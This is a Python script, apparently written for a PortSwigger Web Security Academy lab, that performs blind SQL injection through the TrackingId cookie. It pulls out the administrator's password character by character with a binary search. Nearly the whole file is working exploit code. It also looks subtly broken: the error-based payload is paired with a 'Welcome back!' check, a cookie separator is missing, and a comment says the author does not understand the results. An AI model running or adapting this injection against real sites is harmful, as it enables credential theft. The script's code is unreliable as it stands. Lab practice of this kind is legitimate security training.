#!/usr/bin/python3.6

import requests

LAB_URL = 'https://ac721f6e1f0da78880a84c0b009a00cb.web-security-academy.net'
"""_payload = lambda count, ch, operator: 'x\'+UNION+SELECT+password \
+FROM+users+WHERE+username=\'administrator\'+AND+ \
SUBSTRING(password,' + count + ', 1)'+ operator +'\'' + ch + '\'--'"""
_payload = lambda count, ch, operator: 'xyz\'+UNION+SELECT+CASE+WHEN+ \ 
(username=\'administrator\'+AND+SUBSTRING(password,'+ count + ', 1)'+ \
operator + '\'' + ch + '\')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users--'

_headers = lambda payload: {'Cookie': 'TrackingId=' + payload + \
'session=4PimUJlWIHlSzRYyVfQgQxp9N0Vs3bEF'}

PASSWORD_LENGTH = 6

def is_in_html(phrase, html):
	return phrase in html

count = 1
password = ''

while count <= PASSWORD_LENGTH:
	# still don't understand this behaviour. 
	# setting first to 33 returns values from 1st to 2nd.
	# setting first to 0 returns values from 3rd to 6th.

	first = 33
	last = 126
	mid = None
	found = False

	while first <= last and not found:
		mid = (first + last) // 2
		payload_str = _payload(str(count),chr(mid), '=')
		print('[*]Sending(eq) {} {}'.format(payload_str, mid))
		#make request with payload
		res = requests.get(LAB_URL, headers=_headers(payload_str))	
		if res.status_code == 200 and is_in_html('Welcome back!', res.text):
			password += chr(mid)
			print('[*]Found character at position {} -> \'{}\''.format(count, chr(mid)))
			found = True		
		else:
			payload_str = _payload(str(count), chr(mid), '>')
			print('[*]Sending(gt or lt) {} {}'.format(payload_str, mid))
			res = requests.get(LAB_URL, headers=_headers(payload_str))
			if res.status_code == 200 and is_in_html('Welcome back!', res.text):
				first = mid + 1
			else:
				last = mid - 1				
	count += 1			
		 
print('------------------------------------')
if password:
	print('\n\nFound password {}'.format(password))
else:print('Password not found')
